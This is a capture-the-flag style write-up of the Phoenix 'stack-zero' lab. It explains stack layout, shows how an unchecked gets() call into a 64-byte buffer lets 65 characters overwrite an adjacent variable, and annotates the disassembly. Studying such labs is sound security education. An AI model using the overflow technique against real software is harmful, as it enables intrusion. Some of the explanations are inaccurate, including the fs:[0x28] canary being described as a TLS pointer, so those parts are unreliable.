# Stack Zero
This challenge introduce the problem of stack overflow and how we can change variables in stack using the knowledge we have about the stack layout.
## What Happen to The Stack When a Fucntion is Called?
When a function is called in the C programming language, the data associated with the function call (including the function arguments and local variables) is pushed onto the stack. This means that the values are added to the top of the stack, and they will be the last ones to be removed (according to the principle of last-in, first-out).

For example, consider the following code:
```c
void foo(int x, int y, int z) {
  int a = x + y;
  int b = x * y * z;
  int c = a + b;
  // ...
}

int main() {
  foo(1, 2, 3);
}

```
When the `foo()` function is called in the `main()` function, the values of the arguments `x`, `y`, and `z` (1, 2, and 3, respectively) are pushed onto the stack. The function then creates the local variables `a`, `b`, and `c`, and the values of these variables are also pushed onto the stack.

As the `foo()` function executes, it may push additional data onto the stack, such as temporary variables or intermediate results. For example, if the function calculates the value of `a` by adding `x` and `y`, the intermediate result of that addition would be pushed onto the stack.

When the `foo()` function returns, the values that were pushed onto the stack as part of the function call (including the function arguments and local variables) are popped off the stack. This frees up the memory that was being occupied by those values, allowing it to be used for other purposes.
## Lets Dive into The Code:
```c
struct {
    char buffer[64];
    volatile int changeme;
  } locals;
```
The struct `locals` is stored in the stack and because of the layout of the stack the `buffer` and `changesme` are stored one after another.`buffer` has a size of 64 characters -each character is one byte in the memory- and if we can write more than 64 byte to the buffer it will overwrite the variable `changesme`.`gets` function is a dangerouse function because it does not know the size of the buffer or how much data to write it stops writing data when reading a `\n` character.
```bash
$ python -c 'print("A"*65)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed!

```

## Look At The Assembly 
I will explain each new instruction I encounter.
- `mov` used to move data from one location to another
- `xor` is a logical operation that stands for "exclusive or." It takes two operands and performs a logical comparison between them bit by bit. If both operands have a bit set to 1 in the same position, the result of the xor operation for that position is 0. Otherwise, the result is 1.When it is used with `register` to itself. This has the effect of clearing the `register`, setting all its bits to 0. This is a common idiom in assembly language programming, as it provides a quick and easy way to reset the value of a register to 0 without having to load a constant value into the `register`. (ex, xor 1010, 0101 --> 1111)
- `push`  used to save the current value of a register on the top of the stack. It used at the beginning of function main to store the value of base pointer(prev stack frame) after that `mov rbp, rsp` to make `rbp` points to the top stack `rsp`.
  - `rbp` used to access data in the current stack frame. 
  - `rsp` used to keep track of the current position on the stack.
  - These two registers are used together to access data on the stack in different ways.
- `lea` instruction is used to load the memory address of a variable into a register, allowing the program to access the variable by its address rather than having to copy its contents into a register.
- `call`  used to call a function,
  -  `sym.imp.puts` label indicates that the `puts` function is defined in a different object file or library and must be imported at runtime. 
- `test` =used to perform a bitwise AND operation on two operands and set the flags in the flag register based on the result. It is commonly used in combination with the `jz` or `je` instruction to perform a conditional jump based on the result of the AND operation.
Explain each line of assembly:

```assembly
endbr64
```
https://stackoverflow.com/a/69226244
```assembly
push rbp
mov rbp, rsp
sub rsp, 0x60
```
set up the stack frame by pushing the current base pointer(`RPB`) onto the stack, moving the stack pointer(`RSP`) into the base pointer, and then allocating space on the stack for local variables.
```assembly
mov dword [var_54h], edi ; argc
mov qword [var_60h], rsi ; argv
```
move the contents of the `EDI` and `RSI` registers into memory locations at the addresses stored in the local variables var_54h and var_60h,respectively. In C, the EDI and RSI registers are typically used to store the first and second function arguments, respectively.
```assembly
mov rax, qword fs:[0x28]
```
moves the value stored at the address 0x28 in the fs segment register into the `RAX` register. The `fs` register is typically used to store segment-relative addresses, and the value at address 0x28 is often used to store a pointer to thread-local storage (TLS) data.

```assembly
 mov qword [var_8h], rax
xor eax, eax
lea rax, str.Welcome_to__Stack_Zero__brought_to_you_by_https:__exploit.education ; 0x5641cd35d008 ; "Welcome to  Stack Zero, brought to you by https://exploit.education"
mov rdi, rax
call sym.imp.puts       ; int puts(const char *s)
```
This assembly code reset the `EAX` register to zero , loads a string into the `RAX` and `RDI` registers, and then calls the puts function to print the string stored at `RDI` register to the standard output.
```assembly
 mov dword [var_10h], 0x0 
```
Store zero at the memory address var_10h that hold the value of changeme
```assembly
lea rax, [var_50h] 
mov rdi, rax ; move $rax(the contain the buffer addr) to $rdi for functions gets to use it
call sym.imp.gets      
```
Load the address var_50h to `RAX` then to `RDI` finily call function `gets` using the value which RDI is pointing to.
```assembly
mov eax, dword [var_10h] 
test eax, eax =
je 0x5641cd35c1e5 
lea rax, str.Well_done__the_changeme_variable_has_been_changed_
mov rdi, rax
call sym.imp.puts      
jmp 0x5641cd35c1f4
0x5641cd35c1e5 --> lea rax, str.Uh_oh__changeme_has_not_yet_been_changed._Would_you_like_to_try_again_ 
call sym.imp.puts       
0x5641cd35c1e5 --> mov edi, 0
call sym.imp.exit    
```
Check if `changeme` variable which is stored at the register `EAX` is equal to zero and if its true then jump to the line specified which will print changeme has not been changed, otherwise print the success message and jump to end of function.


